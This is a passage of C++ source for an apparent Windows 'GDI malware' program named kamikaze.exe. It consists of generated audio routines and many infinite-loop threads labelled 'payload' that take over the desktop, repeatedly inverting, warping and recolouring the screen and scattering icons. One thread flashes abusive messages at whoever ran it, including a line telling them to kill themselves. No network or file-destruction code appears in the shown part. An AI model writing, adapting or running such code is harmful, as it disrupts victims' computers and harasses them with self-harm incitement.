	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound19(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * log(t | t >> 9) * sin(t >> 4)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound20(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * ((t / 12) - ((t * 5) % 501)) << 2
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

DWORD WINAPI payload1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int v = 0;
	while (1) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCPAINT);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x ^ y) + v;
		}
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT point[3];
		INT j = cos(v / 25.f) * 250 + sin(v / 12.5f) * 250;
		point[0].x = rect.left + j; point[0].y = rect.top - j;
		point[1].x = rect.right + j; point[1].y = rect.top + j;
		point[2].x = rect.left - j; point[2].y = rect.bottom - j;
		PlgBlt(hdcScreen, point, hdcScreen, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, 0, 0);
		v++;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCPAINT);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}

DWORD WINAPI payload2(LPVOID lpParam) { // by mimiberries, modified by me
	// Dumbass you aren't getting it
}

DWORD WINAPI dist(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w;
		int y = rand() % h;
		int size = 300 + rand() % 100;
		int dist = 10 - rand() % 21;
		int dist2 = 10 - rand() % 21;
		int dist3 = 10 - rand() % 21;
		int dist4 = 10 - rand() % 21;
		BitBlt(hdc, x + dist, y + dist2, size, size, hdc, x + dist3, y + dist4, SRCPAINT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI moricons(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int size = 64 + rand() % 96;
		HINSTANCE hins = LoadLibrary(L"moricons.dll");
		HINSTANCE hins2 = LoadLibrary(L"shell32.dll");
		HINSTANCE hins3 = LoadLibrary(L"netshell32.dll");
		HINSTANCE hins4 = LoadLibrary(L"pifmgr.dll");
		HINSTANCE hins5 = LoadLibrary(L"imageres.dll");
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(hins, MAKEINTRESOURCE(rand() % 113)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(hins2, MAKEINTRESOURCE(rand() % 113)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(hins3, MAKEINTRESOURCE(rand() % 113)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(hins4, MAKEINTRESOURCE(rand() % 113)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(hins5, MAKEINTRESOURCE(rand() % 113)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadCursor(NULL, MAKEINTRESOURCE(100 + rand() % 13)), size, size, 0, 0, DI_NORMAL);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload3_1(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcCopy = CreateCompatibleDC(hdc);

		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcCopy, bmp);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);

		int y = rand() % h;

		BitBlt(hdcCopy, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 21, y, w, 100, hdc, 0, y, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 21, y, w, 100, hdc, 0, y, PATINVERT);
		BitBlt(hdc, 10 - rand() % 21, y, w, 100, hdc, 0, y, 0x987654);

		BLENDFUNCTION blur = { 0, 0, 67, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);

		DeleteObject(brush);
		DeleteObject(bmp);
		DeleteDC(hdcCopy);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload3_2(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcCopy = CreateCompatibleDC(hdc);

		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcCopy, bmp);

		StretchBlt(hdcCopy, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);

		BLENDFUNCTION blur = { 0, 0, 67, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);

		DeleteObject(bmp);
		DeleteDC(hdcCopy);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI ci(int cx, int cy, int size, float angle)
{
	HDC hdc = GetDC(0);

	POINT pt[4];
	float hs = size * 0.1f;

	float base[4][2] = {
		{-hs, -hs},
		{ hs, -hs},
		{ hs,  hs},
		{-hs,  hs}
	};

	float c = cosf(angle);
	float s = sinf(angle);

	for (int i = 0; i < 4; i++)
	{
		float x = base[i][0];
		float y = base[i][1];

		pt[i].x = (LONG)(cx + (x * c - y * s));
		pt[i].y = (LONG)(cy + (x * s + y * c));
	}

	HRGN hrgn = CreatePolygonRgn(pt, 4, WINDING);
	SelectClipRgn(hdc, hrgn);

	HBRUSH brush = CreateSolidBrush(Hue(1));
	SelectObject(hdc, brush);
	BitBlt(hdc, cx - size / 2, cy - size / 2, size, size, hdc, cx - size / 2, cy - size / 2 + 10 - rand() % 21, SRCCOPY);
	BitBlt(hdc, cx - size / 2, cy - size / 2, size, size, hdc, cx - size / 2 + 10 - rand() % 21, cy - size / 2, 0x987654);

	DeleteObject(brush);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left;
	int h = rect.bottom - rect.top;

	float angle = 0.f;
	float radius = 0.f;

	int cx = w / 2;
	int cy = h / 2;
	for (;;)
	{

		int x = (int)(cx + cosf(angle) * radius);
		int y = (int)(cy + sinf(angle) * radius);

		int size = h;

		ci(x, y, size, angle);

		angle += M_PI * 1.51f;
		radius += 1.f;

		if (radius > max(w, h))
		{
			radius = 0;
			cx = rand() % w;
			cy = rand() % h;
			RedrawWindow(0, 0, 0, 133);
		}
	}
}

DWORD WINAPI payload4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w / 20;
	int hs = h / 20;

	DWORD startTime = GetTickCount();

	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCAND);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int cx = (x - (w / 2));
				int cy = (y - (h / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = ((zx + i * 15) ^ (zy + i * 10)) / 50;

				rgbquad[index].rgbRed += (fx + 16);
				rgbquad[index].rgbGreen += (fx + 32);
				rgbquad[index].rgbBlue += (fx + 64);
			}
		}

		i++; angle += 0.071f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0;
}

DWORD WINAPI payload5(LPVOID lpParam) { // by crzxyminty, modified by me
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);    BITMAPINFO bmpi = { 0 };
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int radius = 5.f; double angle = 0;
	while (1) {
		HDC hdc = GetDC(0);
		float x = (cos(angle)) * radius, y = (sin(angle)) * radius;
		HBRUSH brush = CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCPAINT);
		BitBlt(hdc, sw / 10, 0, sw, sh, hdc, x, y, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCINVERT);
		BitBlt(hdc, -sw / 10, 0, sw, sh, hdc, x, y, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCERASE);
		BitBlt(hdc, 0, sh / 10, sw, sh, hdc, x, y, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, 0x94762639);
		BitBlt(hdc, 0, sh / 10, sw, sh, hdc, x, y, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCAND);



		DeleteObject(brush);
		ReleaseDC(0, hdc);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}

DWORD WINAPI bounce(LPVOID lpParam) {
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		DrawIconEx(hdc, x, y, LoadCursor(NULL, IDC_CROSS), 500 + 500 * cos(x / 25.f), 500 + 500 * sin(x / 25.f), 0, NULL, DI_NORMAL);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}

DWORD WINAPI textout(LPVOID lpParam) { // by syexunii
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);

	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	LPCSTR text[10] = {
		"kamikaze.exe",
		"UltraDasher965",
		"syexunii",
		"mimiberries",
		"crzxymint",
		"FUCK YOU!!!",
		"WHY DID YOU RUN THIS???",
		"ARE YOU A FUCKING IDIOT!?",
		"GO KILL YOURSELF, WORTHLESS PIECE OF SHIT!!!",
		"Stupidest decision ever."
	};

	while (1)
	{
		HDC hdc = GetDC(NULL);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);

		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		SetBkColor(hcdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(hcdc, RGB(255, 255, 255));

		HFONT font = CreateFontA(30, 20, 360 - rand() % 720, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Georgia");
		SelectObject(hcdc, font);

		int tmp = rand() % 10;
		TextOutA(hcdc, rand() % w, rand() % h, text[tmp], lstrlenA(text[tmp]));

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(font);
		DeleteObject(hBitmap);
		Sleep(1);
	}
}

DWORD WINAPI payload6(LPVOID lpParam) { // by crzxyminty, modified by me
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), power = 74;
	while (1) {
		for (int angle = 0; angle < 361; angle += M_PI / 2) {
			HDC hdc = GetDC(0);
			int x = power * cos(angle * M_PI / 38.0), y = power * sin(angle * M_PI / 28.0);
			StretchBlt(hdc, x / 2, y / 2, sw - x, sh - y, hdc, 0, 0, sw, sh, SRCCOPY);
			StretchBlt(hdc, x / 2, y / 2, sw - x, sh - y, hdc, 0, 0, sw, sh, SRCPAINT);
			ReleaseDC(0, hdc);
		}
	}
}

DWORD WINAPI cur(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = rand() % GetSystemMetrics(SM_CXSCREEN);
		int y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, x, y, LoadIcon(0, IDI_QUESTION));
		Sleep(1);

		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload7(LPVOID lpvd) // by crzxyminty
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = 360 * i;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 330.f + y / h * .51f, 31.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 1, 1, w - 2, h - 2, hdcCopy, 0, 0, w, h, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;

}

DWORD WINAPI payload8(LPVOID lpParam) { // by crzxyminty
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 3;
	int o = 2;

	RECT rect;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCINVERT);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCPAINT);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, 0x8422381);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, PATINVERT);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = i * (x & y);
				int sat = (i * 90) + (x ^ y);
				int light = x + sin(y / 600.f);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1000.f + y / screenHeight * .12f, 11.f);
				hslcolor.s = fmod(sat / 900.f + y / screenHeight * .22f, 12.f);
				if (hslcolor.l < 40.3f) {
					hslcolor.l += fmod(light / 2000.f + y / screenHeight * .24f, 91.f);;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		POINT lpPoint[3];
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);

		lpPoint[0].x = rect.left - o;
		lpPoint[0].y = rect.top + o;
		lpPoint[1].x = rect.right - o;
		lpPoint[1].y = rect.top - o;
		lpPoint[2].x = rect.left + o;
		lpPoint[2].y = rect.bottom + o;

		o += 60;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 10, 0, screenWidth, screenHeight, 0x00660046);
		StretchBlt(hdcCopy, 1, 1, screenWidth, screenHeight, hdc, 1, 1, screenWidth, screenHeight, PATPAINT);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCAND);
		PlgBlt(hdc, lpPoint, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(1);
	}
}

DWORD WINAPI payload9(LPVOID lpParam) { // by crzxyminty
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, -2, 0, sw, sh + 20, hdc, 0, 0, sw, sh, SRCINVERT);

		StretchBlt(hdc, -2, 0, sw, sh + 20, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, -10, 0, sw, sh + 20, hdc, 0, 0, sw, sh, 0x1900ac210e);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload10(LPVOID lpParam) { // by crzxyminty
	while (1) {
		HDC hdc = GetDC(0);

		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);

		SetStretchBltMode(hdc, HALFTONE);

		StretchBlt(hdc, -1, -1, x + 2, y + 2, hdc, 0, 0, x, y, SRCCOPY);
		StretchBlt(hdc, 1, 1, x - 2, y - 2, hdc, 0, 0, x, y, SRCCOPY);

		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI thefuckingthing(LPVOID lpParam) {// "i used it from vortanide.exe:D" - crzxyminty
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		int randnum = 1 + rand() % 6;
		LPCWSTR name = NULL;
		if (randnum == 1) { name = IDI_ERROR; }
		else if (randnum == 2) { name = IDI_WARNING; }
		else if (randnum == 3) { name = IDI_INFORMATION; }
		else if (randnum == 4) { name = IDI_QUESTION; }
		else if (randnum == 5) { name = IDI_APPLICATION; }
		else if (randnum == 6) { name = IDI_SHIELD; }
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DrawIconEx(hdc, top_x, top_y, LoadIcon(0, name), 3 * GetSystemMetrics(SM_CXICON), 3 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload11(LPVOID lpParam) { // by syexunii
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, 0x1900ac010e);
		BitBlt(hdc, rand() % 100, rand() % 100, w, h, hdc, rand() % 100, rand() % 100, PATPAINT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload12(LPVOID lpParam) { // by syexunii
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += GetRValue(i) * (x * y);
			rgbtriple[i].rgbtGreen += GetGValue(i) & (x + y);
			rgbtriple[i].rgbtBlue += GetBValue(i) | (x ^ y);
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk);
		DeleteDC(deskMem);
		DeleteObject(scr);
		DeleteObject(wnd);
		DeleteObject(rgbtriple);
		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&bmi);
	}
}

DWORD WINAPI payload13(LPVOID lpParam) { // by syexunii
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = randy() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && randy() % 255 == 0)
				v = randy() % 5;
			((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + i + v))[v] ^ byte;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		BitBlt(desk, rand() % 10, rand() % 10, w, h, desk, rand() % 10, rand() % 10, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI payload14(LPVOID lpParam) { // by syexunii
	while (1) {
		HDC hdc = GetDC(0);

		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);

		int x = rand() % w;
		int y = rand() % h;

		BitBlt(hdc, x, 10 - rand() % 21, 100 + rand() % 150, h, hdc, x, 0, SRCINVERT);
		BitBlt(hdc, 2 - rand() % 5, y, w, 100 + rand() % 150, hdc, 0, y, 0x1900ac010e);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);

		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI payload15(LPVOID lpParam) { // by syexunii
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCPAINT);
		GetBitmapBits(hbm, 4 * h * w, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 10)
			byte = randy() % 0xff;
		for (int i = 0; w * h > i; ++i) {
			if (!(i % h) && !(randy() % 25))
				v = randy() % 24;
			*((BYTE*)data + 4 * i + v) *= rand() % 5;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCPAINT);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

